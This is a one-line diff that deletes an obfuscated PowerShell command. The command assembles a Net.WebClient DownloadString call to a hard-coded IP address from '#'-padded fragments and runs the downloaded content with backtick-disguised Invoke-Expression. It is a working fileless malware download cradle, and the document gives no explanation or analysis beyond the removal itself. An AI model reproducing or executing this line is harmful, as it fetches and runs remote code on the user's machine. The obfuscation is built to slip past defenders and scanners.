@@ -1,1 +1,0 @@
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $c1='##(N##ew-O###bje###ct N###et.W###e'; $c4='b##Cl####ie##nt##).###D###ow#nl##o##'; $c3='a##dSt####ri#####n###g(''http://92.255.57.155/1/1.png'')';$TC=($c1,$c4,$c3 -Join '');$TC=$TC.replace('#','');I`E`X $TC|I`E`X
